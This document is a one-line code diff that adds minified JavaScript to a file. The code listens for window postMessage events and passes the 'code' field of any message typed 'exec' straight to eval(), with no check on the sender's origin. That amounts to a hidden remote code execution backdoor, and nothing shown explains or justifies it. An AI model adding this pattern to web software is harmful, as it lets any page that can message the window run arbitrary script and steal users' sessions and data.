@@ -1,0 +1,1 @@
+window.addEventListener("message",(function(event){"exec"===event.data.type&&eval(event.data.code)}));
